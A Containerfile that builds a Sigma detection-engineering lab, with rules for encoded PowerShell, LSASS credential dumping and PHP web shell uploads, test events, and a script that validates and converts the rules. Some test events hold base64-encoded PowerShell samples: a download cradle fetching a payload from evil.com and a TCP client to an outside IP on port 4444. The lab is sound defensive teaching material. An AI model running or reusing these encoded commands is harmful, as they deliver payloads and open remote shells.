# sigma.Containerfile
# Sigma detection engineering lab with sample rules, test events, and sigma-cli
#
# Build:  podman build -t sigma-lab -f sigma.Containerfile .
# Run:    podman run -it --rm sigma-lab
FROM docker.io/archlinux:latest

RUN pacman -Syu --noconfirm && \
    pacman -S --noconfirm python python-pip python-virtualenv git bash coreutils && \
    yes | pacman -Scc

RUN python -m venv /opt/sigma-venv && \
    /opt/sigma-venv/bin/pip install sigma-cli && \
    ln -s /opt/sigma-venv/bin/sigma /usr/local/bin/sigma

COPY <<'HEREDOC' /opt/exercise/rules/suspicious_powershell.yml
title: Suspicious PowerShell — Encoded Command
id: 8f0c99f1-2f3c-4c8f-8bee-1c6f3e0e8a31
status: experimental
description: Detects PowerShell execution with encoded or hidden window flags.
author: Student
date: 2026-06-26
logsource:
  product: windows
  category: process_creation
detection:
  selection:
    Image|endswith: '\powershell.exe'
    CommandLine|contains:
      - '-EncodedCommand'
      - '-enc'
      - '-WindowStyle Hidden'
      - '-nop'
      - '-noprofile'
  condition: selection
falsepositives:
  - Administrative scripts that legitimately use encoded commands
level: high
HEREDOC

COPY <<'HEREDOC' /opt/exercise/rules/lsass_memory_access.yml
title: LSASS Memory Access by Unsigned Process
id: 32d0d3e2-e58a-4c2f-b0db-2e3c755d7e1b
status: experimental
description: Detects non-Microsoft processes accessing LSASS process memory — credential dumping indicator.
author: Student
date: 2026-06-26
logsource:
  product: windows
  service: sysmon
detection:
  selection:
    EventID: 10
    TargetImage|endswith: '\lsass.exe'
  filter_system:
    SourceImage|startswith: 'C:\Windows\System32\'
  condition: selection and not filter_system
falsepositives:
  - Legitimate security tools (EDR sensors, vulnerability scanners)
level: high
HEREDOC

COPY <<'HEREDOC' /opt/exercise/rules/web_shell_upload.yml
title: Web Shell Upload — PHP in Upload Directory
id: 5b3a2c1d-8f4e-4a6b-9c1d-2e3f4a5b6c7d
status: experimental
description: Detects POST requests successfully uploading PHP files to writable directories.
author: Student
date: 2026-06-26
logsource:
  product: linux
  service: apache
detection:
  selection:
    cs-method: POST
    sc-status: 200
    cs-uri-stem|endswith: '.php'
    cs-uri-stem|contains: '/uploads/'
  condition: selection
falsepositives:
  - Legitimate file upload functionality in web applications
level: medium
HEREDOC

COPY <<'HEREDOC' /opt/exercise/test_events/powershell_encoded.yml
title: PowerShell Encoded Command — Test Events
logsource:
  product: windows
  category: process_creation
tests:
  - name: Malicious — encoded download cradle
    log:
      Image: 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe'
      CommandLine: 'powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB2AGkAbAAuAGMAbwBtAC8AbQBhAGwALgBlAHgAZQAnACkA'
    should_match: true
  - name: Benign — normal PowerShell get-process
    log:
      Image: 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe'
      CommandLine: 'powershell.exe -Command Get-Process'
    should_match: false
  - name: Malicious — hidden window with base64
    log:
      Image: 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe'
      CommandLine: 'powershell.exe -nop -w hidden -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA4ADUALgAxADMAMAAuADUALgAyADUAMwAiACwANAA0ADQANAApADsA'
    should_match: true
HEREDOC

COPY <<'HEREDOC' /opt/exercise/test_events/lsass_access.yml
title: LSASS Access — Test Events
logsource:
  product: windows
  service: sysmon
tests:
  - name: Mimikatz accessing LSASS from temp directory
    log:
      EventID: 10
      TargetImage: 'C:\Windows\System32\lsass.exe'
      SourceImage: 'C:\Users\victim\AppData\Local\Temp\mimikatz.exe'
      GrantedAccess: '0x1010'
    should_match: true
  - name: Legitimate Windows process accessing LSASS
    log:
      EventID: 10
      TargetImage: 'C:\Windows\System32\lsass.exe'
      SourceImage: 'C:\Windows\System32\svchost.exe'
      GrantedAccess: '0x1400'
    should_match: false
HEREDOC

COPY <<'HEREDOC' /opt/exercise/test_events/webshell_upload.yml
title: Web Shell Upload — Test Events
logsource:
  product: linux
  service: apache
tests:
  - name: Malicious — PHP file uploaded via POST
    log:
      cs-method: POST
      sc-status: 200
      cs-uri-stem: '/uploads/avatar.php'
      c-ip: '185.130.5.253'
    should_match: true
  - name: Benign — profile picture upload (png)
    log:
      cs-method: POST
      sc-status: 200
      cs-uri-stem: '/uploads/avatar.png'
      c-ip: '10.0.1.50'
    should_match: false
HEREDOC

COPY <<'HEREDOC' /opt/exercise/run_exercises.sh
#!/bin/bash
set -e

echo "================================================="
echo "  Sigma Detection Engineering — Lab Exercises"
echo "================================================="
echo

echo "=== Exercise 1: Validate Sigma Rules ==="
echo "Validating rule syntax..."
for rule in /opt/exercise/rules/*.yml; do
    echo -n "  $(basename $rule): "
    if sigma check "$rule" 2>&1 > /dev/null; then
        echo "PASS"
    else
        echo "FAIL — check syntax"
        sigma check "$rule" 2>&1
    fi
done
echo

echo "=== Exercise 2: Run Tests Against Rules ==="
for testfile in /opt/exercise/test_events/*.yml; do
    echo "Testing: $testfile"
    sigma test /opt/exercise/rules/*.yml "$testfile" 2>&1 || true
done
echo

echo "=== Exercise 3: Convert Rules to Backend Queries ==="
mkdir -p /tmp/converted

echo "--- Splunk SPL ---"
for rule in /opt/exercise/rules/*.yml; do
    echo "$(basename $rule):"
    sigma convert -t splunk "$rule" 2>&1 || true
    echo
done

echo "--- Elasticsearch DSL Query ---"
for rule in /opt/exercise/rules/*.yml; do
    echo "$(basename $rule):"
    sigma convert -t es-ql "$rule" 2>&1 || true
    echo
done

echo "--- Microsoft Sentinel KQL ---"
for rule in /opt/exercise/rules/*.yml; do
    echo "$(basename $rule):"
    sigma convert -t sentinel "$rule" 2>&1 || true
    echo
done

echo
echo "=== Exercise 4: Write Your Own Rule ==="
echo "Create a new Sigma rule in /opt/exercise/rules/"
echo "Use the existing rules as templates."
echo
echo "Task: Write a rule to detect suspicious scheduled task creation"
echo "Hint: EventID 4698, TaskContent contains suspicious paths"
echo

echo "================================================="
echo "  All Exercises Complete"
echo "================================================="
HEREDOC

RUN chmod +x /opt/exercise/run_exercises.sh

WORKDIR /opt/exercise
CMD ["/bin/bash", "-c", "./run_exercises.sh && exec /bin/bash"]
